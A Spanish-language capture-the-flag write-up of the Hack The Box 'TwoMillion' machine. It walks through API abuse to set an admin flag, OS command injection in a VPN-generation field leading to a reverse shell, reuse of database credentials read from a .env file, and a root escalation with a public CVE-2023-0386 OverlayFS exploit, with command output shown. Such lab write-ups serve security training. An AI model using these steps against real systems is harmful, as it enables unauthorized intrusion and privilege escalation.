---
title: Hack The Box TwoMillion
author: k4miyo
date: 2024-05-18
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories:
  - Linux
  - Easy
tags:
  - Injections
  - WebApplication
  - RemoteCodeExecution
  - OSCommandInjection
  - Misconfiguration
  - CommandExecution
ping: true
---
## Máquina TwoMillion
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.11.221.

```bash
❯ ping -c 1 10.10.11.221
PING 10.10.11.221 (10.10.11.221) 56(84) bytes of data.
64 bytes from 10.10.11.221: icmp_seq=1 ttl=63 time=145 ms

--- 10.10.11.221 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 145.110/145.110/145.110/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS -T5 -v -n 10.10.11.221 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 13:25 CST
Initiating Ping Scan at 13:25
Scanning 10.10.11.221 [4 ports]
Completed Ping Scan at 13:25, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:25
Scanning 10.10.11.221 [65535 ports]
Discovered open port 80/tcp on 10.10.11.221
Discovered open port 22/tcp on 10.10.11.221
Completed SYN Stealth Scan at 13:26, 40.82s elapsed (65535 total ports)
Nmap scan report for 10.10.11.221
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 41.16 seconds
           Raw packets sent: 71661 (3.153MB) | Rcvd: 71044 (2.842MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.221
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴─────────────────────────────────
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.11.221 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 13:27 CST
Nmap scan report for 10.10.11.221
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.02 seconds
```

De acuerdo con lo reportado por `nmap`, se observa que se está aplicando virtual hosting, por lo que vamos a agregar el dominio ***2million.htb*** a nuestro archivo `/etc/hosts` y tratemos de saber un poco más del sitio con la herramienta `whatweb`:

```bash
❯ whatweb http://2million.htb/
http://2million.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@hackthebox.eu], Frame, HTML5, HTTPServer[nginx], IP[10.10.11.221], Meta-Author[Hack The Box], Script, Title[Hack The Box :: Penetration Testing Labs], X-UA-Compatible[IE=edge], YouTube, nginx
```

Por el título, podemos pensar que se trata de la página de HackTheBox, así que vamos a echarle un ojo:

![""](/assets/images/htb-twomillion/twomillion_htb.png)

Observamos la página antigua de HTB y de manera similar, podriamos tratar de crearnos una cuenta para tratar de ingresar; por lo que si vamos a la sección de **Join**, nos pide un código:

![""](/assets/images/htb-twomillion/twomillion_codigo.png)

Abriendo el panel de estructura del sitio web; podemos observa un archivo denominado `inviteapi.min.js` en la cual observamos una función que se llama `makeInviteCode`:

![""](/assets/images/htb-twomillion/twomillion_code.png)

Nos vamos al apartado de **Consola** y ejecutamos la función:

![""](/assets/images/htb-twomillion/twomillion_invite.png)

Obtenemos la siguiente cadena de texto:

```json
{data: 'Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr', enctype: 'ROT13'}
```

La pista que nos dan es el tipo de cifrado utilizado ROT13, por lo que podemos utilizar algún recurso en linea que nos ayude como [ROT13](https://rot13.com/):

![""](/assets/images/htb-twomillion/twomillion_rot13.png)

```text
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Por lo tanto, tratemos de realizar una consulta POST hacia el recurso que nos indica:

```bash
❯ curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"NEZJT0gtSEhHT1AtVVJCWE8tQjU1WlY=","format":"encoded"}}#
```

Se obtuvo un código cifrado en base64, por lo que vamos a descifrarlo:

```bash
❯ echo "NEZJT0gtSEhHT1AtVVJCWE8tQjU1WlY=" | base64 -d | xargs
4FIOH-HHGOP-URBXO-B55ZV
```

Vamos a utilizar dicho código para tratar de acceder a la página:

![""](/assets/images/htb-twomillion/twomillion_register.png)

Ya nos podemos registrar en la pagína y podemos loguearnos:

![""](/assets/images/htb-twomillion/twomillion_login.png)

En este sitio, investigando un poco, vemos que podemos descargar el archivo `.ovpn` en la sección de acceso. Por lo que vamos a tratar de ver la petición con **BurpSuite**:

![""](/assets/images/htb-twomillion/twomillion_burp.png)

Vamos a comenzar a ver las peticiones que se tramitan hacia el servidor y tenemos la ruta `/api/v1/user/vpn/generate`; por lo tanto, vamos a ver los resultados de cada recurso que de la URI comenzando por `/api`:

- /api
![""](/assets/images/htb-twomillion/twomillion_api.png)
- /api/v1/
![""](/assets/images/htb-twomillion/twomillion_v1.png)

En la respuesta del lado del servidor vemos que podemos acceder a los recursos siguientes:
- user
	- /api/v1
	- /api/v1/invite/how/to/generate
	- /api/v1/invite/generate
	- /api/v1/user/auth
	- /api/v1/user/vpn/generate
	- /api/v1/user/vpn/regenerate
	- /api/v1/user/vpn/download
	- /api/v1/user/register
	- /api/v1/user/login
- admin
	- /api/v1/admin/auth
	- /api/v1/admin/vpn/generate
	- /api/v1/admin/settings/update

Vamos a tratar de acceder a los recursos del usuario **admin**:

![""](/assets/images/htb-twomillion/twomillion_auth.png)

![""](/assets/images/htb-twomillion/twomillion_generate.png)

![""](/assets/images/htb-twomillion/twomillion_update.png)

Para el recurso  `/api/v1/admin/settings/update` tenemos un código de estado 200 y un error de content type; por lo que vamos a tratar de agregar en la petición **Content-Type**:

![""](/assets/images/htb-twomillion/twomillion_content.png)

Observamos que nos pide un email, así que vamos a tratar de poner uno:

![""](/assets/images/htb-twomillion/twomillion_email.png)

Ahora nos indica que nos falta el parámetro `is_admin`:

![""](/assets/images/htb-twomillion/twomillion_isadmin.png)

Actualizamos a nuestro usuario y vamos a validar si podemos acceder a los recursos de admin:

![""](/assets/images/htb-twomillion/twomillion_adminauth.png)

Somos usuario admin, por lo que vamos a tratar de descargar el archivo `.opvpn`:

![""](/assets/images/htb-twomillion/twomillion_type.png)

Agregando el **Content-Type** y  los datos que nos solicita, tenemos lo siguiente:

![""](/assets/images/htb-twomillion/twomillion_username.png)

Vemos que nos genera las llaves. Ahora vamos a tratar de inyectar comandos en el campo de `username`:

![""](/assets/images/htb-twomillion/twomillion_whoami.png)

Tenemos una forma de inyectar comandos a nivel de sistema, así que tratemos de entablarnos una reverse shell:

![""](/assets/images/htb-twomillion/twomillion_reverse.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.221] 43022
bash: cannot set terminal process group (1174): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ whoami
whoami
www-data
www-data@2million:~/html$ 
```

Antes de hacer algo, vamos a realizar un ![[/posts/tratamiento-tty]] y comenzaremos enumerando el sistema para ver como podemos escalar privilegios. 

```bash
www-data@2million:~/html$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@2million:~/html$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 May 19 02:50 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 May 19 02:50 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$
```

En la ruta donde nos encontramos tenemos el archivo `.env` y tenemos permisos de lectura, así que vamos a ver el contenido:

```bash
www-data@2million:~/html$ cat .env 
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$
```

Tenemos la posible contraseña del usuario admin, por lo que podríamos tratar de validarla accesando por SSH:

```bash
❯ ssh admin@10.10.11.221
The authenticity of host '10.10.11.221 (10.10.11.221)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.221' (ED25519) to the list of known hosts.
admin@10.10.11.221's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 19 02:56:29 AM UTC 2024

  System load:           0.0
  Usage of /:            74.8% of 4.82GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.221
  IPv6 address for eth0: dead:beef::250:56ff:feb9:b5aa


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ whoami
admin
admin@2million:~$
```

Ya somos el usuario `admin` y podemos visualizar la primera flag (user.txt). Vamos a enumerar un poco el sistema para ver como convertirnos en `root`:

```bash
admin@2million:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@2million:~$ sudo -l
[sudo] password for admin: 
Sorry, user admin may not run sudo on localhost.
admin@2million:~$ find / -user admin 2>/dev/null | grep -v -E "proc|sys"
/run/user/1000
/run/user/1000/snapd-session-agent.socket
/run/user/1000/pk-debconf-socket
/run/user/1000/gnupg
/run/user/1000/gnupg/S.gpg-agent
/run/user/1000/gnupg/S.gpg-agent.ssh
/run/user/1000/gnupg/S.gpg-agent.extra
/run/user/1000/gnupg/S.gpg-agent.browser
/run/user/1000/gnupg/S.dirmngr
/run/user/1000/bus
/home/admin
/home/admin/.cache
/home/admin/.cache/motd.legal-displayed
/home/admin/.ssh
/home/admin/.profile
/home/admin/.bash_logout
/home/admin/.bashrc
/var/mail/admin
/dev/pts/1
admin@2million:~$
```

Se observa el recurso `/var/mail/admin`, vamos a ver el contenido del recurso:

```bash
admin@2million:/var/mail$ cat admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
admin@2million:/var/mail$
```

 De acuerdo con el correo electrónico, el sistema presenta una vulnerabilidad relacionada con el kernel de Linux. Investigando un poco, encontramos el sigueinte recurso [CVE-2023-0386](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) y buscando exploits públicos, utilizaremos el siguiente [Github sxlmnwb](https://github.com/sxlmnwb/CVE-2023-0386); asi que primero vamos a descargar el recurso y transferirlo a la máquina víctima:

```bash
❯ git clone https://github.com/sxlmnwb/CVE-2023-0386
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 13 (delta 2), reused 13 (delta 2), pack-reused 0
Receiving objects: 100% (13/13), 8.89 KiB | 8.89 MiB/s, done.
Resolving deltas: 100% (2/2), done.
❯ tar -cvf CVE-2023-0386.tar CVE-2023-0386/
CVE-2023-0386/
CVE-2023-0386/.git/
CVE-2023-0386/.git/branches/
CVE-2023-0386/.git/hooks/
CVE-2023-0386/.git/hooks/applypatch-msg.sample
CVE-2023-0386/.git/hooks/commit-msg.sample
CVE-2023-0386/.git/hooks/fsmonitor-watchman.sample
CVE-2023-0386/.git/hooks/post-update.sample
CVE-2023-0386/.git/hooks/pre-applypatch.sample
CVE-2023-0386/.git/hooks/pre-commit.sample
CVE-2023-0386/.git/hooks/pre-merge-commit.sample
CVE-2023-0386/.git/hooks/pre-push.sample
CVE-2023-0386/.git/hooks/pre-rebase.sample
CVE-2023-0386/.git/hooks/pre-receive.sample
CVE-2023-0386/.git/hooks/prepare-commit-msg.sample
CVE-2023-0386/.git/hooks/push-to-checkout.sample
CVE-2023-0386/.git/hooks/update.sample
CVE-2023-0386/.git/info/
CVE-2023-0386/.git/info/exclude
CVE-2023-0386/.git/description
CVE-2023-0386/.git/refs/
CVE-2023-0386/.git/refs/heads/
CVE-2023-0386/.git/refs/heads/master
CVE-2023-0386/.git/refs/tags/
CVE-2023-0386/.git/refs/remotes/
CVE-2023-0386/.git/refs/remotes/origin/
CVE-2023-0386/.git/refs/remotes/origin/HEAD
CVE-2023-0386/.git/objects/
CVE-2023-0386/.git/objects/pack/
CVE-2023-0386/.git/objects/pack/pack-46235ee1668c8b5d52879e1075fe61f1153bdcd5.pack
CVE-2023-0386/.git/objects/pack/pack-46235ee1668c8b5d52879e1075fe61f1153bdcd5.idx
CVE-2023-0386/.git/objects/info/
CVE-2023-0386/.git/packed-refs
CVE-2023-0386/.git/logs/
CVE-2023-0386/.git/logs/refs/
CVE-2023-0386/.git/logs/refs/remotes/
CVE-2023-0386/.git/logs/refs/remotes/origin/
CVE-2023-0386/.git/logs/refs/remotes/origin/HEAD
CVE-2023-0386/.git/logs/refs/heads/
CVE-2023-0386/.git/logs/refs/heads/master
CVE-2023-0386/.git/logs/HEAD
CVE-2023-0386/.git/HEAD
CVE-2023-0386/.git/config
CVE-2023-0386/.git/index
CVE-2023-0386/Makefile
CVE-2023-0386/README.md
CVE-2023-0386/exp.c
CVE-2023-0386/fuse.c
CVE-2023-0386/getshell.c
CVE-2023-0386/ovlcap/
CVE-2023-0386/ovlcap/.gitkeep
CVE-2023-0386/test/
CVE-2023-0386/test/fuse_test.c
CVE-2023-0386/test/mnt
CVE-2023-0386/test/mnt.c
❯ scp CVE-2023-0386.tar admin@10.10.11.221:/home/admin/
admin@10.10.11.221's password: 
CVE-2023-0386.tar     100%  120KB 213.3KB/s   00:00    
```

```bash
admin@2million:~$ ll
total 156
drwxr-xr-x 4 admin admin   4096 May 19 03:50 ./
drwxr-xr-x 3 root  root    4096 Jun  6  2023 ../
lrwxrwxrwx 1 root  root       9 May 26  2023 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin    220 May 26  2023 .bash_logout
-rw-r--r-- 1 admin admin   3771 May 26  2023 .bashrc
drwx------ 2 admin admin   4096 Jun  6  2023 .cache/
-rw-r--r-- 1 admin admin 122880 May 19 03:50 CVE-2023-0386.tar
-rw-r--r-- 1 admin admin    807 May 26  2023 .profile
drwx------ 2 admin admin   4096 Jun  6  2023 .ssh/
-rw-r----- 1 root  admin     33 May 18 17:11 user.txt
-rw------- 1 admin admin    804 May 19 03:13 .viminfo
admin@2million:~$ tar -xvf CVE-2023-0386.tar 
CVE-2023-0386/
CVE-2023-0386/.git/
CVE-2023-0386/.git/branches/
CVE-2023-0386/.git/hooks/
CVE-2023-0386/.git/hooks/applypatch-msg.sample
CVE-2023-0386/.git/hooks/commit-msg.sample
CVE-2023-0386/.git/hooks/fsmonitor-watchman.sample
CVE-2023-0386/.git/hooks/post-update.sample
CVE-2023-0386/.git/hooks/pre-applypatch.sample
CVE-2023-0386/.git/hooks/pre-commit.sample
CVE-2023-0386/.git/hooks/pre-merge-commit.sample
CVE-2023-0386/.git/hooks/pre-push.sample
CVE-2023-0386/.git/hooks/pre-rebase.sample
CVE-2023-0386/.git/hooks/pre-receive.sample
CVE-2023-0386/.git/hooks/prepare-commit-msg.sample
CVE-2023-0386/.git/hooks/push-to-checkout.sample
CVE-2023-0386/.git/hooks/update.sample
CVE-2023-0386/.git/info/
CVE-2023-0386/.git/info/exclude
CVE-2023-0386/.git/description
CVE-2023-0386/.git/refs/
CVE-2023-0386/.git/refs/heads/
CVE-2023-0386/.git/refs/heads/master
CVE-2023-0386/.git/refs/tags/
CVE-2023-0386/.git/refs/remotes/
CVE-2023-0386/.git/refs/remotes/origin/
CVE-2023-0386/.git/refs/remotes/origin/HEAD
CVE-2023-0386/.git/objects/
CVE-2023-0386/.git/objects/pack/
CVE-2023-0386/.git/objects/pack/pack-46235ee1668c8b5d52879e1075fe61f1153bdcd5.pack
CVE-2023-0386/.git/objects/pack/pack-46235ee1668c8b5d52879e1075fe61f1153bdcd5.idx
CVE-2023-0386/.git/objects/info/
CVE-2023-0386/.git/packed-refs
CVE-2023-0386/.git/logs/
CVE-2023-0386/.git/logs/refs/
CVE-2023-0386/.git/logs/refs/remotes/
CVE-2023-0386/.git/logs/refs/remotes/origin/
CVE-2023-0386/.git/logs/refs/remotes/origin/HEAD
CVE-2023-0386/.git/logs/refs/heads/
CVE-2023-0386/.git/logs/refs/heads/master
CVE-2023-0386/.git/logs/HEAD
CVE-2023-0386/.git/HEAD
CVE-2023-0386/.git/config
CVE-2023-0386/.git/index
CVE-2023-0386/Makefile
CVE-2023-0386/README.md
CVE-2023-0386/exp.c
CVE-2023-0386/fuse.c
CVE-2023-0386/getshell.c
CVE-2023-0386/ovlcap/
CVE-2023-0386/ovlcap/.gitkeep
CVE-2023-0386/test/
CVE-2023-0386/test/fuse_test.c
CVE-2023-0386/test/mnt
CVE-2023-0386/test/mnt.c
admin@2million:~$
admin@2million:~$ cd CVE-2023-0386/
admin@2million:~/CVE-2023-0386$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
admin@2million:~/CVE-2023-0386$ ll
total 1456
drwxr-xr-x 5 admin admin    4096 May 19 03:52 ./
drwxr-xr-x 5 admin admin    4096 May 19 03:51 ../
-rwxrwxr-x 1 admin admin   17160 May 19 03:52 exp*
-rw-r--r-- 1 admin admin    3093 May 19 03:34 exp.c
-rwxrwxr-x 1 admin admin 1407736 May 19 03:52 fuse*
-rw-r--r-- 1 admin admin    5616 May 19 03:34 fuse.c
-rwxrwxr-x 1 admin admin   16096 May 19 03:52 gc*
-rw-r--r-- 1 admin admin     549 May 19 03:34 getshell.c
drwxr-xr-x 8 admin admin    4096 May 19 03:34 .git/
-rw-r--r-- 1 admin admin     150 May 19 03:34 Makefile
drwxr-xr-x 2 admin admin    4096 May 19 03:34 ovlcap/
-rw-r--r-- 1 admin admin     180 May 19 03:34 README.md
drwxr-xr-x 2 admin admin    4096 May 19 03:34 test/
```

De acuerdo con el exploit, abrimos 2 terminales y en una ejecutamos `./fuse ./ovlcap/lower ./gc` y en otra `./exp`:

```bash
admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```

```bash
admin@2million:~/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 May 19 03:53 .
drwxr-xr-x 6 root   root     4096 May 19 03:53 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386# whoami
root
root@2million:~/CVE-2023-0386#
```

Ya somos el usuario `root` y podemos visualizar la flag (root.txt).